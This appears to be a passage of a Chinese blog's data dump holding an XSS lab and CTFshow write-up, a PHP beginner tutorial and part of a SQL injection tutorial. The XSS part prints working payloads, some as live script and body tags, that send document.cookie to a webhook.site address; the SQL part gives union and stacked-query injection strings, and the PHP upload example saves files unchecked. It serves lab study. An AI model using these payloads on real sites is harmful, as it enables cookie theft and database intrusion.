onclick=alert(1)  id=&quot;</code></p><p>须知：相同属性值，前面那一个生效。</p><h3 id="Less-11-Less-12-Less-13"><a href="#Less-11-Less-12-Less-13" class="headerlink" title="Less-11 Less-12 Less-13"></a>Less-11 Less-12 Less-13</h3><p>source：</p><p><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];</code></p><p>&#x2F;&#x2F;Less-12是UA，Less-13是Cookie</p><p><code>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</code></p><p><code>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</code></p><p><code>&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p><p>注入到请求头里面。</p><p>语句：</p><p><code>&quot; type=&#39;text&#39; onclick=alert(1) id=&quot;</code></p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>Less-14涉及exif xss</p><p>由于网站原因，不写这题</p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>本题涉及ng-include包含</p><p>source：</p><p><code>$str = $_GET[&quot;src&quot;];</code></p><p><code>echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;</code></p><p>语句：</p><p><code>src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code></p><p><code>echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;</code></p><p>这段代码可以，但我不懂为什么两个单引号不报错</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>source：</p><p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p><p><code>$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</code></p><p><code>$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</code></p><p><code>$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</code></p><p><code>$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);</code></p><p><code>echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</code></p><p>大小写绕过失效，script、&#x2F;、空格等都被转换成&amp;nbsp，可以尝试使用%0a代替空格来进行绕过</p><p>语句：</p><p><code>&lt;img%0asrc=1%0aonerror=alert(1)&gt;</code></p><h3 id="Less-17-Less-18"><a href="#Less-17-Less-18" class="headerlink" title="Less-17 Less-18"></a>Less-17 Less-18</h3><p>source：</p><p><code>echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</code></p><p>语句：</p><p><code>?arg01=a&amp;arg02=b onmouseover=alert(1)</code></p><p>原理不懂，引用：</p><blockquote><ul><li><code>&lt;embed&gt;</code>：HTML 标签，用于嵌入外部资源，如 Flash 文件。</li><li><code>src=xsf02.swf?&quot;a&quot;=&quot;b onmouseover=alert(1)&quot;</code>：这部分构建了 SWF 文件的 URL。在这里，<code>a</code> 被赋值为 <code>b onmouseover=alert(1)</code>。这可能导致在页面上嵌入的 Flash 文件中触发一个 JavaScript 弹窗，即执行了 <code>alert(1)</code>。</li><li><code>width=100% height=100%</code>：指定嵌入的 SWF 文件的宽度和高度为 100%。</li></ul></blockquote><hr><h2 id="CTFSHOW-WEB入门-XSS闯关"><a href="#CTFSHOW-WEB入门-XSS闯关" class="headerlink" title="CTFSHOW WEB入门 XSS闯关"></a>CTFSHOW WEB入门 XSS闯关</h2><h3 id="316"><a href="#316" class="headerlink" title="316"></a>316</h3><p>尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，正常弹窗，没有过滤</p><p>payload：</p><script>window.open('https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?cookie='+document.cookie)</script><h3 id="317-318-319"><a href="#317-318-319" class="headerlink" title="317 318 319"></a>317 318 319</h3><p>317过滤了script，318过滤了img</p><p>方法1：失败</p><p><code>&lt;img src=1 onerror=alert(1)&gt;</code>成功</p><p>payload：</p><p>&lt; img src&#x3D;1 onload&#x3D;”window.open(‘<a href="https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?cookie=%27+document.cookie)%22%3E">https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?cookie=&#39;+document.cookie)&quot;&gt;</a></p><p>但是这得到的是本地cookie</p><p>方法2：成功</p><p><code>&lt;body onload=alert(1)&gt;&lt;/body&gt;</code>成功</p><p>payload：</p><body onload="window.open('https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?cookie='+document.cookie)"></body><p>须知：onload可以执行JavaScript代码，当script被过滤后可以尝试使用它。</p><h3 id="320–326"><a href="#320–326" class="headerlink" title="320–326"></a>320–326</h3><p>空格过滤了，用&#x2F;**&#x2F;</p><p>payload：</p><p>&lt;body&#x2F;**&#x2F;onload&#x3D;”window.open(‘<a href="https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?cookie=%27+document.cookie)%22%3E">https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?cookie=&#39;+document.cookie)&quot;&gt;</a></body></p><h3 id="327"><a href="#327" class="headerlink" title="327"></a>327</h3><p>一直网络拥堵，唉。</p><h3 id="328"><a href="#328" class="headerlink" title="328"></a>328</h3><p>先得到admin的cookie：将用户名或者密码进行xss注入，payload：</p><script>window.open('https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?cookie='+document.cookie)</script><p>可以在网站上得到admin的cookie，在控制台的application里改cookie，然后刷新即可。</p><h3 id="329"><a href="#329" class="headerlink" title="329"></a>329</h3><p>payload：</p><p>&lt;body&#x2F;**&#x2F;onload&#x3D;window.open(‘<a href="https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?a=%27+document.getElementsByClassName">https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?a=&#39;+document.getElementsByClassName</a>(‘layui-table-cell laytable-cell-1-0-1’))&gt;</body></p><h3 id="330"><a href="#330" class="headerlink" title="330"></a>330</h3><p>‘ union select ‘a’,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,0,’g’),1,’h’),2,’i’),3,’j’),4,’k’),5,’l’),6,’m’),7,’n’),8,’o’),9,’p’) from ctfshow_user4</p>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP入门</title>
      <link href="/2024/03/18/PHP%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/PHP%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP入门"><a href="#PHP入门" class="headerlink" title="PHP入门"></a>PHP入门</h1><h2 id="基础教程"><a href="#基础教程" class="headerlink" title="基础教程"></a>基础教程</h2><p>基础教程以后再补，先上高级教程。</p><h3 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a>超级全局变量</h3><h2 id="高级教程"><a href="#高级教程" class="headerlink" title="高级教程"></a>高级教程</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="高维数组"><a href="#高维数组" class="headerlink" title="高维数组"></a>高维数组</h4><p>给代码，慢慢悟</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="variable">$men</span> = <span class="keyword">array</span>(    <span class="keyword">array</span>(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;bcd&#x27;</span>),    <span class="keyword">array</span>(<span class="string">&#x27;bnc&#x27;</span>,<span class="string">&#x27;acc&#x27;</span>));<span class="title function_ invoke__">print_r</span>(<span class="variable">$men</span>);<span class="variable">$women</span> = <span class="keyword">array</span>(    <span class="string">&#x27;pq&#x27;</span>=&gt;<span class="keyword">array</span>(        <span class="string">&#x27;pp&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;bcd&#x27;</span>)    ),    <span class="string">&#x27;xq&#x27;</span>=&gt;<span class="keyword">array</span>(        <span class="string">&#x27;pp&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;bcd&#x27;</span>)    ));<span class="title function_ invoke__">print_r</span>(<span class="variable">$women</span>);</code></pre><h4 id="date函数"><a href="#date函数" class="headerlink" title="date函数"></a>date函数</h4><p>例子：date(‘?,?,?’)，?是规定的字符。其间的逗号是连接符，可以用其他的符号代替。</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>要求：主文件的后缀必须是.php，也就是主文件必须是PHP文件。</p><p>类型：include，require</p><blockquote><p><strong>include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：</strong></p><ul><li>require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。</li><li>include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。</li></ul></blockquote><p><strong>原理：被包含文件代码会在相应位置执行，该特点决定了代码逻辑。</strong></p><h3 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h3><h4 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h4><p>对应函数：<strong>fopen()</strong></p><p>语法：fopen(‘path’, ‘mode’)，此函数的第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件</p><p>引用：模式参数表</p><blockquote><table><thead><tr><th>r</th><th>只读。在文件的开头开始。</th></tr></thead><tbody><tr><td>r+</td><td>读&#x2F;写。在文件的开头开始。</td></tr><tr><td>w</td><td>只写。打开并清空文件的内容；如果文件不存在，则创建新文件。</td></tr><tr><td>w+</td><td>读&#x2F;写。打开并清空文件的内容；如果文件不存在，则创建新文件。</td></tr><tr><td>a</td><td>追加。打开并向文件末尾进行写操作，如果文件不存在，则创建新文件。</td></tr><tr><td>a+</td><td>读&#x2F;追加。通过向文件末尾写内容，来保持文件内容。</td></tr><tr><td>x</td><td>只写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。</td></tr><tr><td>x+</td><td>读&#x2F;写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。</td></tr></tbody></table><p><strong>注释：</strong>如果 fopen() 函数无法打开指定文件，则返回 0 (false)。</p></blockquote><h4 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h4><p>对应函数：fclose()</p><p>语法：fclose($file)</p><h4 id="检测文件末尾（EOF）"><a href="#检测文件末尾（EOF）" class="headerlink" title="检测文件末尾（EOF）"></a>检测文件末尾（EOF）</h4><p>feof() 函数检测是否已到达文件末尾（EOF）。</p><p>语法：feof($file)</p><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>逐行读取文件：fgets($file)</p><p>逐字读取文件：fgetc($file)</p><p>任意读取文件：fread()</p><p>语法：fread($file, int $length)</p><p>例子：</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;example.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);<span class="variable">$content</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">filesize</span>(<span class="string">&#x27;example.txt&#x27;</span>));<span class="keyword">echo</span> <span class="variable">$content</span>;</code></pre><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h4><p>分为两个模块：HTML表单，PHP</p><p>HTML表单：</p><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span>    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="tag">&lt;<span class="name">title</span>&gt;</span>FORM<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;update.php&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span>        filename：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span>        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span>    <span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre><blockquote><ul><li><strong><form></strong> 标签的 <strong>enctype</strong> 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 “<strong>multipart&#x2F;form-data</strong>“。</li><li><strong><input></strong> 标签的 <strong>type&#x3D;”file”</strong> 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</li></ul></blockquote><p>PHP：</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="comment">#ini_set(&#x27;display_errors&#x27;, 0);</span><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>)&#123;    <span class="keyword">echo</span> <span class="string">&quot;错误：&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;&#125; <span class="keyword">else</span>&#123;    <span class="keyword">echo</span> <span class="string">&quot;上传文件名: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;    <span class="keyword">echo</span> <span class="string">&quot;文件类型: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;    <span class="keyword">echo</span> <span class="string">&quot;文件大小: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; kB&lt;br&gt;&quot;</span>;    <span class="keyword">echo</span> <span class="string">&quot;文件临时存储的位置: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];&#125;</code></pre><blockquote><p>通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。</p><p>第一个参数是表单的 input name，第二个下标可以是 “name”、”type”、”size”、”tmp_name” 或 “error”。如下所示：</p><ul><li>$_FILES[“file”][“name”] - 上传文件的名称</li><li>$_FILES[“file”][“type”] - 上传文件的类型</li><li>$_FILES[“file”][“size”] - 上传文件的大小，以字节计</li><li>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称</li><li>$_FILES[“file”][“error”] - 由文件上传导致的错误代码</li></ul></blockquote><h4 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h4><p>代码：</p><pre><code class="highlight php"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;    <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;&#125;<span class="keyword">else</span>&#123;    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);&#125;</code></pre><p>整体代码：</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="comment">#ini_set(&#x27;display_errors&#x27;, 0);</span><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>)&#123;    <span class="keyword">echo</span> <span class="string">&quot;错误：&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;&#125; <span class="keyword">else</span>&#123;    <span class="keyword">echo</span> <span class="string">&quot;上传文件名: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;    <span class="keyword">echo</span> <span class="string">&quot;文件类型: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;    <span class="keyword">echo</span> <span class="string">&quot;文件大小: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; kB&lt;br&gt;&quot;</span>;    <span class="keyword">echo</span> <span class="string">&quot;文件临时存储的位置: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];&#125;<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;    <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;&#125;<span class="keyword">else</span>&#123;    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);&#125;</code></pre><p>附：文件夹upload需要先存在。</p><h3 id="PHP-Cookie"><a href="#PHP-Cookie" class="headerlink" title="PHP Cookie"></a>PHP Cookie</h3><h4 id="创建Cookie"><a href="#创建Cookie" class="headerlink" title="创建Cookie"></a>创建Cookie</h4><p>语法：setcookie(name, value, expire, path, domain)</p><p>须知：setcookie() 函数必须位于 <html> 标签之前。</p><p>示例代码：</p><pre><code class="highlight php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;pq&#x27;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">5</span>);<span class="meta">?&gt;</span>&lt;html&gt;······</code></pre><h4 id="使用Cookie"><a href="#使用Cookie" class="headerlink" title="使用Cookie"></a>使用Cookie</h4><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])&#123;    <span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];&#125;<span class="meta">?&gt;</span></code></pre><h4 id="删除Cookie"><a href="#删除Cookie" class="headerlink" title="删除Cookie"></a>删除Cookie</h4><p>将开头的时间设置为过期时间即可</p><p>完整代码：</p><pre><code class="highlight php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;pq&#x27;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">5</span>);<span class="meta">?&gt;</span>&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;    &lt;P&gt;HELLO,&lt;/P&gt;&lt;/body&gt;&lt;/html&gt;<span class="meta">&lt;?php</span><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])&#123;    <span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];&#125;<span class="meta">?&gt;</span><span class="meta">&lt;?php</span><span class="keyword">if</span>(!<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])&#123;    <span class="keyword">echo</span> <span class="string">&quot;Cookie isn&#x27;t exists&quot;</span>;&#125;<span class="meta">?&gt;</span></code></pre><h3 id="PHP-Session"><a href="#PHP-Session" class="headerlink" title="PHP Session"></a>PHP Session</h3><h4 id="启动会话"><a href="#启动会话" class="headerlink" title="启动会话"></a>启动会话</h4><p>在设置session之前，必须启动会话，如下：</p><p><code>&lt;?php session_start(); ?&gt;</code></p><p>须知：session_start()必须位于<html>标签之前。</p><h4 id="储存Session"><a href="#储存Session" class="headerlink" title="储存Session"></a>储存Session</h4><blockquote><p>存储和取回 session 变量的正确方法是使用 PHP $_SESSION 变量</p></blockquote><h4 id="销毁-Session"><a href="#销毁-Session" class="headerlink" title="销毁 Session"></a>销毁 Session</h4><p>使用 unset() 或 session_destroy() 函数。</p><p>unset() 函数用于释放指定的 session 变量， session_destroy() 函数彻底销毁 session。</p><p>完整代码：</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="title function_ invoke__">session_start</span>();<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;pq&#x27;</span>;<span class="meta">?&gt;</span>&lt;html&gt;&lt;body&gt;&lt;p&gt;HELLO&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;<span class="meta">&lt;?php</span><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>])&#123;    <span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];&#125;<span class="title function_ invoke__">session_destroy</span>();<span class="meta">?&gt;</span></code></pre><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入入门</title>
      <link href="/2024/03/18/SQL%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/SQL%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h1><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="判断字符型或者数字型注入"><a href="#判断字符型或者数字型注入" class="headerlink" title="判断字符型或者数字型注入"></a>判断字符型或者数字型注入</h3><p>字符型：</p><p>&#x2F;?id&#x3D; 1’ and ‘1’&#x3D;‘1 正确</p><p>&#x2F;?id&#x3D; 1’ and ‘1’&#x3D;‘2’ 语义错误（非语法错误）</p><p>数字型：</p><p>&#x2F;?id&#x3D; 1 and 1&#x3D;1 正确</p><p>&#x2F;?id&#x3D; 1 and 1&#x3D; 2 语义错误（非语法错误）</p><h3 id="记忆"><a href="#记忆" class="headerlink" title="记忆"></a>记忆</h3><p>核心数据库：information_schema</p><p>其中的表：schema, tables, columns</p><p>其中的列：</p><p>schema：schemata</p><p>tables：table_schema</p><p>columns：table_name</p><h3 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h3><blockquote><p><em><strong>*updatexml()函数的使用：更新xml文档的函数，返回替换的XML片段*</strong></em></p><p><em><strong>*语法：updatexml（xml_documat，XPath_string，new_value）*</strong></em></p><p>参数：1xml_documat：是STRING格式，为XML文档对象的名称，这一项可以输入一个十六进制的字符，比如0x26（&amp;）。</p><p>2XPath_string：是XPath的格式的字符串，报错注入时需要写入错误的格式来显示错误的信息。</p><p>3new_value：是string格式替换查找到符合条件的数据，在注入时可以加入任意字符，比如0x26（&amp;）。</p></blockquote><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>GET：–+</p><p>POST：#</p><p>附：如果是GET想用#，则先进行URL编码：%23</p><h3 id="过滤与绕过"><a href="#过滤与绕过" class="headerlink" title="过滤与绕过"></a>过滤与绕过</h3><h4 id="select过滤"><a href="#select过滤" class="headerlink" title="select过滤"></a>select过滤</h4><p>查库：show database();</p><p>查表：show tables；</p><p>查列：desc table_name;</p><p>查数据：看来必须要用select关键字，直接预编译：</p><blockquote><p>@预定义prepare模板</p><p>prepare xxx as select * from user where id&#x3D;1;  &#x2F;&#x2F;将select查询语句定义为xxx</p><p>execute xxx;  &#x2F;&#x2F;再使用execute来执行这个变量xxx即可执行上诉的select查询语句</p><p>所以本题，先是使用prepare来预定义@a语句为hello，然后再使用execute来执行hello，这里execute执行的就是@a语句。</p></blockquote><p>举个栗子：0’;sEt@a&#x3D;concat(“sel”,”ect flag from  <code>1919810931114514</code>“);PRepare hello from @a;execute hello;#</p><blockquote><p>这里是通过concat函数将查询语句进行连接，然后赋值给变量@a，然后再通过prepare来预定义@a的查询语句为hello，最后再使用execute来执行hello。</p></blockquote><h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><p>联合注入</p><p>报错注入</p><p>布尔盲注</p><p>时间盲注</p><p>头部注入</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>该注入需要特殊的条件，比如函数：mysqli_multi_query()，其可以执行一条或多条SQL语句。</p><p>使用格式也简单，用分号**;**闭合语句，再写入一条语句。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>推荐文章：<a href="https://zhuanlan.zhihu.com/p/39917830">https://zhuanlan.zhihu.com/p/39917830</a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><blockquote><p><strong>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。</strong><br><strong>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</strong></p></blockquote><p>须知：二次注入并不会马上生效，正如其名，会在下次相关SQL语句执行时生效。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>推荐文章：<a href="https://blog.csdn.net/m0_46467017/article/details/126247133">https://blog.csdn.net/m0_46467017/article/details/126247133</a></p><h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p>宽字节：如果一个字符的大小为两个字节，则称之为宽字节。</p><blockquote><p>像<strong>GB2321、GBK、GB18030、BIG5、Shift_JIS</strong>等这些编码都是常说的宽字节，也就是只有两个字节。<br>英文默认占一个字节，中午占两个字节。</p></blockquote><h4 id="宽字节注入的条件"><a href="#宽字节注入的条件" class="headerlink" title="宽字节注入的条件"></a>宽字节注入的条件</h4><ol><li>数据库为GBK编码</li><li>使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符\进行转义</li></ol><p>具体看Less-32，我写得尽量详细一点</p><h2 id="sqlilab"><a href="#sqlilab" class="headerlink" title="sqlilab"></a>sqlilab</h2><h3 id="Less-1-Less-2"><a href="#Less-1-Less-2" class="headerlink" title="Less-1 Less-2"></a>Less-1 Less-2</h3><p>tip：最基本的整数型与字符型注入</p><p>1.判断GET还是POST</p><p>&#x2F;?id&#x3D;1</p><p>2.是否有单引号闭合</p><p>在基础模块（上文）有提及，不赘述</p><p>3.判断占位数</p><p>&#x2F;?id&#x3D;1 order by 1正确</p><p>&#x2F;?id&#x3D;1 order by 2正确</p><p>&#x2F;?id&#x3D;1 order by 3正确</p><p>&#x2F;?id&#x3D;1 order by 4报错</p><p>4.查看显示位</p><p>太简单，不赘述</p><p>5.爆数据（有单引号闭合的自行加入，下文默认数字型）</p><p>爆库：</p><p>&#x2F;?id&#x3D;-1 union select 1,2, group_concat(schema_name) from information_schemata –+  </p><p>爆表：</p><p>&#x2F;?id&#x3D;-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘HHH’  –+ 